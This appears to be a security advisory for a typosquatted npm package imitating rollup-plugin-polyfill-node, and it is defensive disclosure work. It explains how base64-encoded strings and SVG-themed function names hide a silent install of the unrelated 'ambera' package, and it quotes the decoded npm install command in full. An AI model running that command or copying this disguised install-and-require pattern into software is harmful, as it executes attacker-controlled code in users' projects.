summary: Typosquat of rollup-plugin-polyfill-node silently installs and executes external npm package on require
details: The package name typosquats the legitimate `rollup-plugin-polyfill-node`. On require of `dist/index.js`, a top-level function (named `ValidateSvgModule`/`checkPlugin` as an SVG cover story) decodes two base64 literals: the string `npm install ambera --no-save --silent --no-audit --no-fund` and the module name `ambera`. It spawns the decoded npm install command to silently fetch the unrelated `ambera` package from the registry, then require()'s it and invokes `getPlugin()()`, executing attacker-controlled code inside any project that imports this module. The base64 obfuscation and misleading function names hide the install-and-require sinks from casual review.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
